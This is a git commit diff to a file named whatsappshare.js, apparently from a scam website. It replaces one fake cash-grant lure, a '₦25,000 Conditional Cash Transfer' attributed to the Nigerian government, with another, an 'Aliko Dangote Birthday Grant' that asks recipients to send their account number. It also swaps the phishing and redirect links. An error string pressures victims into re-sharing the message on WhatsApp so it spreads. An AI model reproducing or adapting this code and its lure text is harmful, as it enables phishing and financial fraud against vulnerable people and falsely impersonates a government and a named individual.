b179826b9f3360340db3f389cec8c175c0313670
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-01-23 21:46:21 -0800

    Update whatsappshare.js

--- whatsappshare.js
+++ whatsappshare.js
@@ -1,9 +1,9 @@
 
-        var text1 = "*₦25,000 Conditional Cash Transfer For this Month*%0A%0A*Dont Miss this Month FG ₦25,000 CCT*%0A%0A*FG has disbursed ₦25,000 each to 15 million Nigerians* %0A%0A*The 2024 Renewed Hope Conditional Cash Transfer of President Bola Tinubu’s administration would provide 15 million Nigerian with a cash transfer of ₦25,000 for three months*%0A%0A_Check if you are among the 15 million Nigerians to withdraw_ ₦25,000 each%0A%0A*WITHDRAW FOR THIS MONTH* 👇%0Ahttps://xmas-gift.org/fg25kcash.html",
+       var text1 = "*₦31,500 Aliko Dangote Birthday Grant to all Nigerians*%0A%0A*Dont Miss this year Aliko Dangote Birthday Grant*%0A%0ASend your account number now to receive your cash in 15 minutes%0A%0APowered by Aliko Dangote Foundation%0A%0A*CHECK HERE* 👇%0Ahttps://2024-program.xyz/dangoteat67.html",
             text2 = " an amount of ",
             text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
-            abcde = "https://bit.ly/yhauajjdng",
+            abcde = "http://outrotomr.com/4/3144603",
             saved = "",
             share = "whatsapp://send?text=" + text1;
    
